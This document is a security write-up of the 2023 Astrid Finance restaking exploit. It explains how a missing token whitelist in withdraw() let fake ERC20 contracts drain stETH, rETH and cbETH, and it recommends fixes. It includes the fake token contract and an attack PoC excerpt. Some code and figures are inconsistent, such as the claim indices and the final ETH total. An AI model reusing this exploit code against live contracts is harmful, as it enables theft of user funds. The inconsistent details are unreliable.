# Astrid Finance — Fake Token Input Validation Absence (Business Logic Flaw) Analysis

| Field | Details |
|------|------|
| **Date** | 2023-10-28 |
| **Protocol** | Astrid Finance (Ethereum Restaking Protocol) |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$228,591 (on-chain measured: ~63.64 ETH equivalent) |
| **Attacker** | [0x792e...3959](https://etherscan.io/address/0x792ec27874e1f614e757a1ae49d00ef5b2c73959) |
| **Attack Contract** | [0xB2E8...6188](https://etherscan.io/address/0xb2e855411f67378c08f47401eacff37461e16188) |
| **Attack Tx** | [0x8af9...fb60](https://etherscan.io/tx/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60) |
| **Vulnerable Contract** | [0xbAa8...BA70](https://etherscan.io/address/0xbAa87546cF87b5De1b0b52353A86792D40b8BA70) |
| **Root Cause** | Missing input token address validation in `withdraw()` — allows withdrawal of real stETH/rETH/cbETH using a fake ERC20 token |
| **PoC Source** | [DeFiHackLabs — Astrid_exp.sol](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Astrid_exp.sol) |

---

## 1. Vulnerability Overview

Astrid Finance is an Ethereum-based restaking protocol that allows users to deposit staking derivative tokens such as stETH (Lido), rETH (Rocket Pool), and cbETH (Coinbase) in exchange for restaking tokens like astETH.

The core vulnerability is that the `withdraw(address _restakedTokenAddress, uint256 amount)` function performs no validation whatsoever to verify that the `_restakedTokenAddress` argument is a legitimate staking token permitted by the protocol.

The attacker exploited this by **directly deploying a fake ERC20 token contract** that manipulated the following:

1. `stakedTokenAddress()` → returns the real stETH/rETH/cbETH address
2. `scaledBalanceToBalance(uint256)` → returns the protocol's entire real token balance as-is

The protocol mistook the fake token for a real one, and in response to the fake token withdrawal request, transferred all of its actual stETH/rETH/cbETH holdings to the attacker. The attacker drained ~$228,591 (~63.64 ETH equivalent) with no flash loan — just a simple contract deployment.

---

## 2. Vulnerable Code Analysis

### 2.1 Missing Input Token Address Validation (Core Vulnerability)

```solidity
// ❌ Vulnerable code — no input address validation whatsoever
function withdraw(address _restakedTokenAddress, uint256 amount) external {
    // ❌ Does not verify whether _restakedTokenAddress is a permitted token
    // ❌ Passes even if the attacker supplies an arbitrarily deployed fake token contract

    // Calls stakedTokenAddress() on the fake token to obtain the underlying token address
    // → Attacker manipulates the return value to return the real stETH address
    address stakedToken = IRestakedToken(_restakedTokenAddress).stakedTokenAddress();

    // Computes the withdrawal amount via the fake token's scaledBalanceToBalance()
    // → Attacker manipulates it to return the protocol's entire holdings
    uint256 actualAmount = IRestakedToken(_restakedTokenAddress).scaledBalanceToBalance(amount);

    // Transfers the attacker's fake tokens into the protocol (fake tokens can be minted infinitely)
    IERC20(_restakedTokenAddress).transferFrom(msg.sender, address(this), amount);

    // Issues a withdrawerIndex and adds it to the claim queue
    // → Registers a withdrawal of actualAmount of real stakedToken (e.g. stETH) into the queue
    _registerWithdrawal(msg.sender, stakedToken, actualAmount);
}
```

```solidity
// ✅ Fixed code — adds whitelist-based input validation
// Register permitted restaked tokens at deployment time
mapping(address => bool) public allowedRestakedTokens;

function withdraw(address _restakedTokenAddress, uint256 amount) external {
    // ✅ Must verify the token is a permitted restaked token
    require(
        allowedRestakedTokens[_restakedTokenAddress],
        "Astrid: token address not permitted"
    );

    // ✅ Call stakedTokenAddress only on validated addresses
    address stakedToken = IRestakedToken(_restakedTokenAddress).stakedTokenAddress();

    // ✅ Call scaledBalanceToBalance only on validated addresses
    uint256 actualAmount = IRestakedToken(_restakedTokenAddress).scaledBalanceToBalance(amount);

    // Safe because the attacker cannot supply a fake token
    IERC20(_restakedTokenAddress).transferFrom(msg.sender, address(this), amount);

    _registerWithdrawal(msg.sender, stakedToken, actualAmount);
}
```

**Issue**: The `_restakedTokenAddress` parameter is never validated to confirm it is an official astETH/astRETH/astCBETH contract issued by the protocol. The attacker deployed a fake ERC20 contract with arbitrary return values for `stakedTokenAddress()` and `scaledBalanceToBalance()`, bypassing all checks.

---

### 2.2 Fake Token Contract Design (Attack Weapon)

```solidity
// Fake ERC20 deployed by the attacker in the PoC — disguised as a real token
contract MyERC20 {
    address public stakedTokenAddr;     // stores the real token address
    uint256 public scaledBalanceToBal;  // set to the protocol's entire balance

    constructor(
        address _stakedTokenAddress,  // ← real stETH/rETH/cbETH address
        uint256 bal                   // ← real token balance held by the protocol
    ) {
        stakedTokenAddr = _stakedTokenAddress;
        scaledBalanceToBal = bal;
    }

    // ❌ Vulnerable contract calls this function → returns real stETH address
    function stakedTokenAddress() external returns (address) {
        return stakedTokenAddr;
    }

    // ❌ Vulnerable contract uses this to compute withdrawal amount → returns full protocol balance
    function scaledBalanceToBalance(uint256) external returns (uint256) {
        return scaledBalanceToBal;  // always returns the protocol's entire balance
    }

    // Fake tokens can be minted without limit (no access control)
    function mint(uint256 amount) external {
        balanceOf[msg.sender] += amount;
        totalSupply += amount;
    }
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker EOA: `0x792e...3959`
- No pre-funding required (no flash loan used)
- Attack contract deployed: `0xB2E8...6188` (block 18,448,168 — contract deployed and attack executed within the same tx)

### 3.2 Execution Phase

```
[Attack begins — Block 18,448,168]
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 1: Query protocol's token balances          │
│                                                 │
│  stETH.balanceOf(Astrid) → 64.176 stETH         │
│  rETH.balanceOf(Astrid)  → 39.166 rETH          │
│  cbETH.balanceOf(Astrid) → 20.000 cbETH         │
└─────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 2: Deploy 3 fake ERC20 contracts per token  │
│                                                 │
│  FakeToken_A(stakedTokenAddr=stETH, bal=64.176) │
│  FakeToken_B(stakedTokenAddr=rETH,  bal=39.166) │
│  FakeToken_C(stakedTokenAddr=cbETH, bal=20.000) │
└─────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 3: Mint fake tokens + Approve               │
│                                                 │
│  FakeToken_X.mint(10,000 ETH equivalent)        │
│  FakeToken_X.approve(Astrid, type(uint256).max) │
└─────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 4: Call withdraw() — register real deposit  │
│         amount using fake tokens (×3)            │
│                                                 │
│  Astrid.withdraw(FakeToken_A, 64.176e18)        │
│    ← FakeToken_A.stakedTokenAddress() → stETH  │
│    ← FakeToken_A.scaledBalanceToBalance()       │
│       → 64.176 stETH (full protocol balance)    │
│    ← 64.176 FakeToken_A transferred to protocol │
│    ← withdrawerIndex = 12 issued               │
│                                                 │
│  (repeated identically for rETH, cbETH)         │
└─────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 5: Call claim() — receive real tokens (×3)  │
│                                                 │
│  Astrid.claim(12) → receive 64.176 stETH        │
│  Astrid.claim(13) → receive 39.166 rETH         │
│  Astrid.claim(14) → receive 20.000 cbETH        │
└─────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 6: Swap received stETH/rETH/cbETH → ETH    │
│                                                 │
│  stETH ──▶ Curve stETH Pool ──▶ ~64.03 ETH     │
│  rETH  ──▶ UniswapV3 Pool   ──▶ ~42.62 WETH    │
│  cbETH ──▶ UniswapV3 Pool   ──▶ ~21.02 WETH    │
└─────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────┐
│ Step 7: WETH.withdraw() → unwrap to ETH          │
│                                                 │
│  WETH(63.64) → 63.64 ETH                        │
│  Final attacker profit: ~63.64 ETH (≈ $228,591) │
└─────────────────────────────────────────────────┘
```

### 3.3 Outcome

| Item | Amount |
|------|------|
| stETH stolen | 64.1760 stETH |
| rETH stolen | 39.1658 rETH |
| cbETH stolen | 20.0004 cbETH |
| Final ETH received | ~63.64 ETH |
| USD loss | ~$228,591 |

---

## 4. PoC Code Excerpt (DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Core attack logic: drain all stETH/rETH/cbETH from the protocol using fake tokens
function testExpolit() public {
    // [Step 1] Prepare target token list
    address[] memory stakedTokens = new address[](3);
    stakedTokens[0] = address(stETH);   // Lido stETH
    stakedTokens[1] = address(rETH);    // Rocket Pool rETH
    stakedTokens[2] = address(cbETH);   // Coinbase cbETH

    uint256[] memory balances = new uint256[](3);

    for (uint8 i = 0; i < stakedTokens.length; i++) {
        // [Step 2] Query actual token balance held by the protocol
        uint256 staked_bal = IERC20(stakedTokens[i]).balanceOf(address(vulnerable));
        balances[i] = staked_bal;

        // [Step 3] Deploy fake ERC20 token:
        //   - stakedTokenAddr = real token address (e.g. stETH)
        //   - scaledBalanceToBal = protocol's entire holdings (used to manipulate withdrawal amount)
        MyERC20 fake_token = new MyERC20(stakedTokens[i], staked_bal);

        // [Step 4] Mint a large amount of fake tokens (no access control — anyone can mint)
        fake_token.mint(10_000 * 1e18);

        // [Step 5] Approve the protocol to spend fake tokens
        fake_token.approve(address(vulnerable), type(uint256).max);

        // [Step 6] Core attack:
        //   withdraw() calls fake_token.stakedTokenAddress() → returns stETH address
        //   withdraw() calls fake_token.scaledBalanceToBalance() → returns full balance
        //   → Protocol mistakes the fake token for real and registers it in the withdrawal queue
        vulnerable.withdraw(address(fake_token), staked_bal);

        // [Step 7] Claim real stETH/rETH/cbETH using the registered withdrawal index
        vulnerable.claim(i);
        // → Real tokens are transferred to the attacker
    }

    // [Step 8] stETH → ETH (via Curve Pool)
    stETH.approve(address(LidoCurvePool), balances[0]);
    LidoCurvePool.exchange(1, 0, balances[0], 0);

    // [Step 9] rETH → WETH (via Uniswap V3)
    rETH.approve(address(rETHPool), balances[1]);
    rETHPool.swap(address(this), true, int256(balances[1]), 4_295_128_740, new bytes(0));

    // [Step 10] cbETH → WETH (via Uniswap V3)
    cbETH.approve(address(cbETHPool), balances[2]);
    cbETHPool.swap(address(this), true, int256(balances[2]), 4_295_128_740, new bytes(0));

    // [Step 11] WETH → ETH final unwrap
    WETH.withdraw(WETH.balanceOf(address(this)));
    // Attack complete: ~63.64 ETH obtained
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing whitelist validation for input token address | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Trusting return values from untrusted external contracts | HIGH | CWE-345 (Insufficient Verification of Data Authenticity) |
| V-03 | Manipulable withdrawal amount calculation (scaledBalanceToBalance forgery) | HIGH | CWE-682 (Incorrect Calculation) |

### V-01: Missing Whitelist Validation for Input Token Address

- **Description**: The `withdraw(address _restakedTokenAddress, ...)` function does not verify that `_restakedTokenAddress` is an official restaked token issued by the protocol. An attacker can supply an arbitrary contract address and fully control the return values of that contract's interface implementations.
- **Impact**: Entire protocol holdings of stETH/rETH/cbETH can be drained
- **Attack Condition**: Sufficient for the attacker to deploy a fake contract implementing the ERC20 interface (no pre-funding required)

### V-02: Trusting External Contract Return Values

- **Description**: The result of `IRestakedToken(_restakedTokenAddress).stakedTokenAddress()` is trusted without verification. An attacker can design a fake contract that returns the real stETH address from this function.
- **Impact**: Protocol registers a real token withdrawal against a fake token
- **Attack Condition**: Same as V-01

### V-03: scaledBalanceToBalance Withdrawal Amount Manipulation

- **Description**: The return value of `scaledBalanceToBalance(uint256 a)` determines the actual quantity of tokens to be withdrawn. The attacker manipulates this function to return the protocol's entire holdings, draining all funds in a single call.
- **Impact**: Entire protocol balance drained in one shot
- **Attack Condition**: Same as V-01

---

## 6. Remediation Recommendations

### Immediate Actions

**Fix 1: Whitelist-Based Token Address Validation**

```solidity
// ✅ Only register permitted restaked tokens (managed at deployment or via governance)
mapping(address => bool) public allowedRestakedTokens;
mapping(address => address) public restakedToStakedToken; // stores restaked → staked mapping

// Only governance or owner can add permitted tokens
function addAllowedToken(address restakedToken, address stakedToken) external onlyOwner {
    allowedRestakedTokens[restakedToken] = true;
    restakedToStakedToken[restakedToken] = stakedToken;
}

function withdraw(address _restakedTokenAddress, uint256 amount) external {
    // ✅ Whitelist check is mandatory
    require(
        allowedRestakedTokens[_restakedTokenAddress],
        "Astrid: restaked token not permitted"
    );

    // ✅ Use stored mapping instead of external call (removes untrusted external call)
    address stakedToken = restakedToStakedToken[_restakedTokenAddress];

    // ✅ Validate withdrawal amount upper bound
    uint256 actualAmount = IRestakedToken(_restakedTokenAddress).scaledBalanceToBalance(amount);
    require(
        actualAmount <= IERC20(stakedToken).balanceOf(address(this)),
        "Astrid: withdrawal amount exceeds holdings"
    );

    IERC20(_restakedTokenAddress).transferFrom(msg.sender, address(this), amount);
    _registerWithdrawal(msg.sender, stakedToken, actualAmount);
}
```

**Fix 2: Strengthen Withdrawal Amount Validation**

```solidity
// ✅ Track cumulative pending withdrawals to prevent exceeding actual holdings
mapping(address => uint256) public pendingWithdrawals; // token → total pending withdrawal amount

function _registerWithdrawal(address user, address stakedToken, uint256 amount) internal {
    // ✅ holdings - already pending withdrawals >= new withdrawal amount
    require(
        IERC20(stakedToken).balanceOf(address(this)) - pendingWithdrawals[stakedToken] >= amount,
        "Astrid: exceeds available balance"
    );
    pendingWithdrawals[stakedToken] += amount;
    // ... rest of logic
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: No address validation | Implement allowedRestakedTokens whitelist with governance-based management |
| V-02: Trusting external return values | Remove untrusted external calls; use protocol-internal mappings |
| V-03: Amount manipulation | Enforce withdrawal amount upper bound; track cumulative pending withdrawals |
| Structural | Establish a token registration procedure prior to deployment; publish permitted token list on-chain |
| Monitoring | Implement automatic pause when a single transaction withdraws more than a set percentage of total holdings |

---

## 7. Lessons Learned

1. **Never trust external contract input**: Contract addresses passed to functions that trigger fund transfers — such as `withdraw()` — must be validated against a whitelist. Blindly trusting addresses or amounts returned by external contracts allows forged return values to drain the entire protocol.

2. **Interface compliance ≠ trustworthiness**: A contract implementing a defined interface does not mean its return values are honest. In particular, functions that return an `address` or a `uint256` amount can return arbitrary values.

3. **Devastating attacks are possible without a flash loan**: This attack was executed with nothing more than a contract deployment — no flash loan, no price manipulation, no reentrancy. A single missing input validation is enough to instantly drain an entire protocol's funds.

4. **Special risks in restaking protocols**: Protocols that interact with external token contracts such as stETH, rETH, and cbETH must explicitly manage "which contracts are permitted tokens." Any design that trusts a token interface must assume that an attacker can always deploy a malicious contract satisfying that interface.

5. **Initialize the whitelist at deployment**: Protocols that operate immediately without a governance delay should explicitly initialize their permitted token list at deployment, and require any new token additions to go through a timelocked governance process.

6. **Check for similar patterns everywhere**: `ArbitraryCall`-class vulnerabilities occur identically in ERC4626 vaults, bridges, and DEX aggregators. Every code path that accepts an external address as a parameter and calls functions on that address must be audited.

---

## 8. On-Chain Verification

> Block 18,448,168 / Tx: [0x8af9...fb60](https://etherscan.io/tx/0x8af9b5fb3e2e3df8659ffb2e0f0c1f4c90d5a80f4f6fccef143b823ce673fb60)

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | On-Chain Actual Value | Notes |
|------|-------------|------|
| stETH drained | 64.1760 stETH | Confirmed via Astrid → attack contract Transfer event |
| rETH drained | 39.1658 rETH | Confirmed via Astrid → attack contract Transfer event |
| cbETH drained | 20.0004 cbETH | Confirmed via Astrid → attack contract Transfer event |
| rETH→WETH received | 42.6181 WETH | UniV3 rETH Pool → attack contract |
| cbETH→WETH received | 21.0206 WETH | UniV3 cbETH Pool → attack contract |
| Final ETH withdrawn | 63.6387 ETH | Confirmed via WETH.withdraw() event |

### 8.2 On-Chain Event Log Sequence

| Log# | Event | Description |
|------|--------|------|
| 0x0~0x2 | FakeToken Mint × 3 | 3 fake token types minted (10,000 ETH each) |
| 0x3~0x5 | FakeToken Approval × 3 | Fake tokens approved for Astrid |
| 0x6 | FakeToken_stETH Transfer → Astrid | Fake stETH tokens transferred to protocol |
| 0x7 | Astrid WithdrawRequested (0x1966...) | stETH withdrawal registered, index=12 |
| 0x8 | FakeToken_stETH Burn | Fake tokens burned |
| 0xa | **stETH Transfer: Astrid → attack contract** | 64.17 real stETH drained |
| 0xd~0x12 | Same flow repeated for rETH | 39.17 rETH drained |
| 0x13~0x18 | Same flow repeated for cbETH | 20.00 cbETH drained |
| 0x1b~0x1d | stETH → Curve Pool swap | stETH exchanged for ETH |
| 0x1f~0x22 | rETH → UniV3 Pool swap | rETH → 42.62 WETH |
| 0x24~0x26 | cbETH → UniV3 Pool swap | cbETH → 21.02 WETH |
| 0x27 | WETH Withdrawal | 63.64 ETH final unwrap |

### 8.3 Precondition Verification

- Attack contract (`0xB2E8...6188`) was deployed within the same tx (`to` field is empty; `contractAddress` = attack contract)
- Attacker EOA (`0x792e...3959`) nonce = 0 (fresh wallet)
- Attack executed with no prior ETH balance (only gas fees required)
- No flash loan — attack completed solely via contract deployment + interface forgery
- withdrawerIndex: stETH=12, rETH=13, cbETH=14 (prior legitimate withdrawal queue entries from other users exist)

---

*References: [Phalcon Analysis](https://twitter.com/Phalcon_xyz/status/1718454835966775325) | [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-10/Astrid_exp.sol)*